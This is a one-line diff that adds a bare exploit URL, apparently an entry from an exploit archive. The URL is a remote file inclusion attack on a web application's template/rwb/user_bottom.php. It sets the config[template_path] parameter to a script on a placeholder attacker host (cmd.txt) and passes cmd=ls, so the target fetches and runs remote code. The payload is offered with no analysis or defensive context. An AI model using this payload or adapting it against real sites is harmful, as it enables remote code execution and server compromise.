@@ -1,0 +1,1 @@
+http://www.example.com/[path]/template/rwb/user_bottom.php?config[template_path]=http://[attacker]/cmd.txt?&cmd=ls
